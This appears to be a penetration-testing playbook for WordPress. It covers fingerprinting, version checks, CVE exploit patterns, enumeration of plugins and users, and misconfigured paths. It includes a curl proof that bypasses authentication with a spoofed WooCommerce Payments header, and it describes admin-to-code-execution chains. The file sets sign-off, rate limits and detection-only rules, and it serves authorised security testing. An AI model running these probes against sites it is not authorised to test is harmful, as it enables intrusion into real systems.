# WordPress

The largest attack surface in this skill, and the one where the extension layer
dwarfs core. Treat core as a date check and spend your time on plugins, themes
and roles.

All probes in this file are **Stage A (read-only)** unless a heading says Stage
B. Every Stage B step needs the operator's written sign-off, a tester-owned
account, an inert proof first and an immediate restore.

Rate posture for every loop here: serial, one request at a time, 1.5s base plus
up to 1.5s jitter. Caps per host: 15 version requests, 200 extension slug
probes, 50 user-enumeration requests, 25 leftover-path probes.

```bash
# Define this before any loop below. Never tighten it to finish a list faster.
pace() { sleep "$(awk -v s=$RANDOM 'BEGIN{srand(s);print 1.5+rand()*1.5}')"; }
```

## 1. Fingerprint corroboration

Two artifacts minimum. A single path is not a fingerprint.

| Artifact | Request | What it proves |
|---|---|---|
| REST API link header | `curl -sI "$T/"` and look for `Link: <https://target.example/wp-json/>; rel="https://api.w.org/"` | Core is WordPress and the REST API is routed. Survives generator-tag stripping. |
| Asset directories | `wp-content/`, `wp-includes/` references in the saved baseline HTML | WordPress layout |
| Generator tag | `<meta name="generator" content="WordPress N" />` | Core version, when not stripped |
| Core sitemap | `GET /wp-sitemap.xml` | Core 5.5 or later, and the content inventory |
| Login form | `GET /wp-login.php` | Core, plus whether the login screen has been replaced |
| Cookie names | `wordpress_test_cookie`, `wp-settings-time-<id>` | WordPress session layer |

## 2. Version pinning, then the support verdict

Candidate sources, cheapest first:

```bash
T="https://target.example"
# 1. generator tag (often stripped)
curl -s -m 15 "$T/" | grep -oE '<meta name="generator" content="WordPress [^"]+'
# 2. version query string on a CORE asset, not a plugin asset
curl -s -m 15 "$T/" | grep -oE '/wp-includes/[^"'"'"']+\?ver=[0-9.]+' | head -5
# 3. readme and licence files, often removed by hardening
curl -s -m 15 "$T/readme.html" | grep -oiE 'Version [0-9.]+'
curl -s -m 15 "$T/license.txt" | head -3
# 4. REST index: exposes namespaces, which bounds the version and lists plugins
curl -s -m 15 "$T/wp-json/" | python3 -I -c 'import json,sys; d=json.load(sys.stdin); print(d.get("name")); print(sorted(d.get("namespaces",[])))'
```

Then ask whether that exact version still receives fixes. WordPress publishes a
per-version verdict:

```bash
curl -s https://api.wordpress.org/core/stable-check/1.0/ | python3 -I -c \
  'import json,sys; print(json.load(sys.stdin).get("<VERSION>","unknown"))'
# "latest" | "outdated" | "insecure"
```

Record the date you queried it. A verdict of `insecure` is a strong input but
still not a finding on its own, because of backports (see section 7).

## 3. Core advisories worth knowing by name

Verified against NVD this session. These are the two recent core chains; core
bugs of this severity are rare, which is why extensions matter more.

| CVE | What it is | Affected | Fixed | Score |
|---|---|---|---|---|
| CVE-2026-64638 ("XSS2Shell") | Pre-authentication reflected XSS on the login screen. Escalates toward PHP execution only with a logged-in administrator's interaction on an attacker-controlled page, so it needs successful social engineering. Root cause is a parser differential: a tag-like construct with whitespace immediately after `<` is not seen as markup by `strip_tags()` but is later treated as an element by the markup filter. | All versions | 7.0.3, backported to every branch back to 4.7 | CVSS 4.0 8.9 High |
| CVE-2026-63030 + CVE-2026-60137 ("wp2shell") | A REST API batch endpoint route-confusion issue combined with missing sanitisation of the `author__not_in` parameter of `WP_Query`. Together they allow SQL injection and remote code execution, with no authentication. The SQLi half only triggers when a plugin or theme passes untrusted input into that parameter. | 63030: 6.9.x before 6.9.5, 7.0.x before 7.0.2. 60137: 6.8.x before 6.8.6, 6.9.x before 6.9.5, 7.0.x before 7.0.2 | 6.9.5, 7.0.2 (and 6.8.6 for 60137) | 9.8 Critical / 5.9 Medium |

Sources: <https://nvd.nist.gov/vuln/detail/CVE-2026-64638>,
<https://nvd.nist.gov/vuln/detail/CVE-2026-63030>,
<https://nvd.nist.gov/vuln/detail/CVE-2026-60137>.

Detection signals that generalise beyond these two CVEs, and are worth asking
the client's logs for: a `log` login parameter containing `<` followed by
whitespace; REST requests combining `_jsonp`, `_method` and `_envelope`;
unexpected hits on `authorize-application.php`; newly created application
passwords; a REST page creation immediately followed by a plugin ZIP upload.

## 4. Extension enumeration, passive before active

```bash
# Passive: from the page you already fetched. Zero extra requests.
grep -oE 'wp-content/(plugins|themes)/[a-z0-9._-]+' /tmp/cms-baseline.html | sort -u
# Passive: version per extension, from its own asset query string
grep -oE 'wp-content/(plugins|themes)/[a-z0-9._-]+/[^"'"'"']+\?ver=[0-9.]+' /tmp/cms-baseline.html | sort -u
# Passive: REST namespaces name plugins that register routes
curl -s -m 15 "$T/wp-json/" | grep -oE '"[a-z0-9-]+/v[0-9]+"' | sort -u
```

Active confirmation of one slug, with the existence oracle controlled:

```bash
# Compare a real slug against a deliberately invented one. If both answer the
# same way, the directory response is not an existence oracle on this host.
for slug in "<candidate-slug>" "zz-not-a-real-plugin-$RANDOM"; do
  printf '%s ' "$slug"
  curl -s -o /dev/null -w '%{http_code} %{size_download}\n' -m 15 \
    "$T/wp-content/plugins/$slug/readme.txt"
  pace
done
```

The authoritative version for a plugin is the `Stable tag:` or `Version:` line
in its own `readme.txt` or main PHP file header when those are readable, not a
guess from the asset query string.

## 5. Verified extension advisories

Each row was read from its advisory this session. Use them as both concrete
targets and as a pattern catalogue.

| Extension | CVE | Affected | Fixed | Score | Pattern |
|---|---|---|---|---|---|
| WooCommerce Payments | CVE-2023-28121 | <= 5.6.1 | 5.6.2 | 9.8 | Unauthenticated attacker sends requests as an elevated user. A client-supplied request header (`X-Wcpay-Platform-Checkout-User`) sets the current-user context, so `POST /wp-json/wp/v2/users` with an administrator role succeeds without credentials. |
| OttoKit / SureTriggers | CVE-2025-27007 | <= 1.0.82 | 1.0.83 | 9.8, listed as exploited | A REST route mints a reusable connection key from a request-supplied username, with no capability check. The key is then accepted as a universal bypass on privileged routes. |
| SureTriggers | CVE-2025-3102 | <= 1.0.78 | 1.0.79 | 8.1 | Missing empty-value check on `secret_key` in the authentication function, so an unconfigured install accepts an empty secret and allows administrator creation. |
| Service Finder Bookings (`sf-booking`) | CVE-2025-23970 | <= 6.1 | 6.2 | 9.8 | A user-switching helper wired to the public `init` hook derives identity from a client-controlled cookie and calls `wp_set_auth_cookie()`, logging the requester in as an arbitrary user ID. |
| FunnelKit Automations (`wp-marketing-automations`) | CVE-2025-1562 | <= 3.5.3 | 3.6.0 | 9.8, listed as exploited | Missing capability check on the `install_or_activate_addon_plugins()` function, combined with a weak nonce hash. The nonce pass is treated as a green light and the capability check is skipped, allowing unauthenticated arbitrary plugin installation. |
| Depicter Slider | CVE-2025-2011 | <= 3.6.1 | 3.6.2 | NVD 7.5 High; Patchstack scores it 9.3 and lists it as exploited. Cite both. | Unauthenticated SQL injection. The `s` search parameter of several `depicter-*` actions is insufficiently escaped and the query is not prepared. |
| Kubio AI Page Builder | CVE-2025-2294 | <= 2.5.1 | 2.5.2 | 9.8 | Unauthenticated local file inclusion through the `kubio_hybrid_theme_load_template` function: a template path is used without normalisation or containment, so arbitrary PHP on the server can be included and executed. |
| Motors theme | CVE-2025-64374 | <= 5.6.81 | 5.6.82 | 9.9 | An authenticated AJAX helper installs and activates a plugin from a URL in the request. Only a CSRF nonce gates it, and that nonce is printed on a page any logged-in user can load, so a subscriber reaches arbitrary plugin installation. |

Advisories with no CVE located this session, cited by their vendor write-up
because the pattern is instructive:

- **Litho theme <= 3.0, unauthenticated arbitrary file deletion.** A "remove
  font family" AJAX action registered with the `wp_ajax_nopriv_` prefix, with no
  nonce, no capability check and no path sanitisation, concatenating a POST
  value into a filesystem path under the uploads directory.
  <https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/>
  **Detection only in this skill.** The published proof deletes a core
  configuration file, which is destructive and causes an outage. Do not run it.
  Confirm the handler exists and is unauthenticated by observing the response to
  the action name with an empty parameter, then stop and cite the advisory for
  impact.
- **Jobmonster theme <= 4.7.9, unauthenticated broken authentication.** A social
  login AJAX handler falls back to trusting a POST field as the user's email
  when provider data is absent, then calls `wp_set_auth_cookie()`. Setting the
  provider to an unsupported value reaches the fallback.
  <https://patchstack.com/articles/unauthenticated-broken-authentication-vulnerability-in-wordpress-jobmonster-theme/>
- **WP Job Portal <= 2.3.2, unauthenticated SQL injection and arbitrary file
  download.** Two tasks reachable through `admin-post.php`, gated only by a CSRF
  nonce that is published on a page containing one of the plugin's shortcodes.
  One concatenates a parent-category ID into a query; the other concatenates a
  filename into a read sink.
  <https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/>
- **Admin and Site Enhancements <= 7.6.2.1, privilege escalation.** A "view as
  role" feature stores the user's original roles in user meta and restores them
  from a request parameter, authorising on a plugin option array rather than on
  the actor's capabilities.
  <https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/>

## 6. The four audit patterns that find these without a CVE

When you can read the extension's source, these four questions find the bug
faster than any request. They are the generalisation of the table above.

1. **Is a handler registered for anonymous callers?**
   `add_action('wp_ajax_nopriv_<action>', ...)` makes the callback reachable
   without a session. Anything sensitive behind it needs a capability check, a
   nonce and strict input validation. Missing any one of the three is the bug.
2. **Does a REST route skip its permission check?**
   `register_rest_route(..., ['permission_callback' => '__return_true'])` means
   no authorization. Also treat a `permission_callback` that only checks
   `is_user_logged_in()` as missing, when the action needs a capability.
3. **Is a nonce being used as authorization?** `wp_verify_nonce()` and
   `check_ajax_referer()` are CSRF controls. They say the request came from a
   page the user loaded. They never say the user is allowed to perform the
   action. Any privileged operation guarded only by a nonce is exploitable by
   whoever can load the page that prints it, which on a site with open
   registration is anyone.
4. **Is identity taken from the client?** Grep for `wp_set_auth_cookie()`,
   `wp_set_current_user()`, `get_user_by('email', ...)` and
   `wp_insert_user()`/`wp_create_user()` inside AJAX or REST handlers, then
   trace where the user identifier came from. A header, a cookie or a POST field
   is client input, and an upstream component is not a security boundary unless
   it cryptographically binds the value.

Also check for files inside a plugin directory that do real work when requested
directly, without bootstrapping WordPress authorization.

## 7. Stage A proof for a header-trust bug, without creating state

The published proof for the WooCommerce Payments pattern creates an
administrator. That is Stage B and it is usually unnecessary. A read-only
identity check is enough to show the authentication boundary is bypassed:

```bash
# Stage A. Reads the identity the application assigns to the request.
# Creates nothing. Run the control first.
curl -s -o /tmp/me-control.json -w 'control %{http_code}\n' -m 15 \
  "$T/wp-json/wp/v2/users/me"
curl -s -o /tmp/me-spoof.json -w 'spoofed %{http_code}\n' -m 15 \
  -H "X-Wcpay-Platform-Checkout-User: 1" \
  "$T/wp-json/wp/v2/users/me"
diff /tmp/me-control.json /tmp/me-spoof.json
```

An anonymous control returning 401 while the header-bearing request returns a
user object is the finding. If the route is unavailable on this build, do not
escalate to the account-creating proof without sign-off; cite the advisory's
affected range and the version you confirmed.

## 8. User enumeration

Two channels, cross-checked, capped at 50 requests.

```bash
# Channel 1: author ID probe. 200 or 30x means the ID resolves; 400/404 means it does not.
for i in $(seq 1 15); do
  printf 'id=%s ' "$i"
  curl -s -o /dev/null -w '%{http_code} %{redirect_url}\n' -m 15 "$T/?author=$i"
  pace
done

# Channel 2: REST users route. Only exposes users who have authored content.
curl -s -m 15 "$T/wp-json/wp/v2/users" | \
  python3 -I -c 'import json,sys; [print(u.get("id"), u.get("slug"), u.get("name")) for u in json.load(sys.stdin)]'

# Channel 3: oEmbed on a known post URL also names its author.
curl -s -m 15 "$T/wp-json/oembed/1.0/embed?url=<POST-URL>"
```

The REST route and `xmlrpc.php` as SSO or MFA bypasses are owned by
`hunt-auth-bypass`. Here they are enumeration only. Do not proceed to password
guessing; that is `hunt-brute-force`.

## 9. Leftover and misconfiguration paths

Detect only. Never submit the installer form: completing it can reinitialise the
database.

| Path | Meaning |
|---|---|
| `/wp-admin/install.php` | An orphaned or incomplete install. A body containing the installation prompt is the signal. `offensive-osint` already carries this probe; reuse its result rather than re-sending. |
| `/wp-admin/setup-config.php` | Pre-install configuration step still reachable, which is worse: it accepts database parameters. |
| `/wp-content/debug.log` | `WP_DEBUG_LOG` left on. Frequently contains full paths, queries and occasionally tokens. |
| `/wp-config.php.bak`, `.old`, `.save`, `~`, `wp-config.txt` | Editor and deployment leftovers served as text. Confirm the content type and the first bytes; do not harvest the credentials. |
| `/wp-content/uploads/` with directory listing | Exposed media, and sometimes exported data or backups under a plugin's subdirectory. |
| Backup archives under the web root | `hunt-source-leak` owns this. If you find one, stop enumerating extensions and read it. |

## 10. Admin-to-RCE, and why it is usually not a finding

An administrator can edit a theme or plugin file from the dashboard, or upload a
plugin ZIP, and both reach PHP execution. **This is documented, intended
WordPress behaviour.** On its own it is not a vulnerability, and reporting it as
one costs credibility.

It matters only as the back half of a chain whose front half you have proven:
a privilege escalation, an authentication bypass, or a cross-site scripting bug
that an administrator will trigger. Two realistic front halves, both covered
above: a nonce-gated installer reachable by a subscriber, and a header-trust bug
that mints an administrator.

**Stage B, sign-off required**, and only on a tester-owned install: create a
plugin ZIP whose only payload is an inert marker (for example a file that echoes
a canary string), upload it, request the file to prove the path is executed,
then deactivate and delete it and record the restore. Never leave a webshell,
never upload to a production store, never modify an active theme on a live site.

## 11. False-positive killers specific to WordPress

- **An old version string with the fix backported.** WordPress's own advisory
  for CVE-2026-64638 states the fix went to every branch back to 4.7. Managed
  hosts also patch in place. A version comparison alone proves nothing.
- **A plugin directory 403 is not an installed plugin.** Compare against an
  invented slug on the same host before believing the oracle.
- **A plugin version from an asset query string can be wrong.** Caching plugins,
  CDNs and asset concatenators rewrite `?ver=`. Corroborate with the plugin's own
  readme or header when readable.
- **A theme bundling a library is not that library's plugin.** The vulnerable
  code path may not be registered at all.
- **`/wp-json/wp/v2/users` returning an empty array does not mean no users.**
  The route only lists users who have published content.
- **A WAF returning 403 to one payload and 200 to another is not an injection
  oracle.** Send the clean request first; these ecosystems' real bugs look like
  ordinary traffic and need no obfuscation.
- **Multisite.** One install serves many hostnames with different active plugin
  sets. Confirm per hostname, and confirm the hostname is in scope.
